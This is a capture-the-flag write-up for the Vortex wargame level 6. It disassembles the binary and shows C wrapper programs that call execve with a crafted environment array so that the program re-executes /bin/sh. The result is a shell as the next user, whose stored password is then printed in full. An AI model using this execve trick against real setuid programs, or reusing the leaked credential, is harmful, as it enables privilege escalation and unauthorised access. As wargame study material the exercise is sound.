Dump of assembler code for function main:
```assembly
   0x0804849f <+0>:     push   ebp
   0x080484a0 <+1>:     mov    ebp,esp
   0x080484a2 <+3>:     and    esp,0xfffffff0
   0x080484a5 <+6>:     sub    esp,0x10
   0x080484a8 <+9>:     mov    eax,DWORD PTR [ebp+0x10]
   0x080484ab <+12>:    mov    eax,DWORD PTR [eax]		#eax = env[0]
   0x080484ad <+14>:    test   eax,eax				#if env[0] == 0
   0x080484af <+16>:    je     0x80484be <main+31>		#jmp
   0x080484b1 <+18>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080484b4 <+21>:    mov    eax,DWORD PTR [eax]
   0x080484b6 <+23>:    mov    DWORD PTR [esp],eax
   0x080484b9 <+26>:    call   0x804847d <restart>
   0x080484be <+31>:    mov    eax,DWORD PTR [ebp+0x10]		#=env[0]
   0x080484c1 <+34>:    add    eax,0xc
   0x080484c4 <+37>:    mov    eax,DWORD PTR [eax]		#=env[something]
   0x080484c6 <+39>:    mov    DWORD PTR [esp],eax
   0x080484c9 <+42>:    call   0x8048330 <printf@plt>
   0x080484ce <+47>:    mov    DWORD PTR [esp],0x7325
   0x080484d5 <+54>:    call   0x8048340 <_exit@plt>
```
Dump of assembler code for function restart:
```assembly
   0x0804847d <+0>:     push   ebp
   0x0804847e <+1>:     mov    ebp,esp
   0x08048480 <+3>:     sub    esp,0x18
   0x08048483 <+6>:     mov    DWORD PTR [esp+0x8],0x0
   0x0804848b <+14>:    mov    eax,DWORD PTR [ebp+0x8]
   0x0804848e <+17>:    mov    DWORD PTR [esp+0x4],eax
   0x08048492 <+21>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048495 <+24>:    mov    DWORD PTR [esp],eax
   0x08048498 <+27>:    call   0x8048350 <execlp@plt>		#execute vortex6 again with env[0] (infinite loop)
   0x0804849d <+32>:    leave  
   0x0804849e <+33>:    ret
```
we need the env[0] to be 0, so we'll use a c file:
```c
##include<stdio.h>                                                                                             
#include<stdlib.h>                                                                                            
#include<unistd.h>                                                                                            
                                                                                                              
int main(int argc, char* argv[]) {                                                                                                                
        char* env[] = {0x0, 				"AAAA"};                                                                              
        execve("/vortex/vortex6", env,env);
	perror("execve");
        return 0;                                                   
}
```
running it we get:  
__libc_start_main(0x804849f, 0, 0xffffdf14, 0x80484e0 <unfinished ...>
printf("!"#$%&'()*+,-./0123456789:;<=>?@"... <no return ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

not exactly what we wanted...  
lets see what if we indeed put something else in env[0]...
lets try /bin/sh...
```c
##include<stdio.h>                                                                                             
#include<stdlib.h>                                                                                            
#include<unistd.h>                                                                                            
                                                                                                              
int main(int argc, char* argv[]) {                                                                                                                
        char* env[] = {"/bin/sh", 				"AAAA"};                                                                              
        execve("/vortex/vortex6", env,env);
	perror("execve");
        return 0;                                                   
}
```
it worked!

$ whoami
vortex7
$ cat /etc/vortex_pass/vortex7
Y52jxHtt/



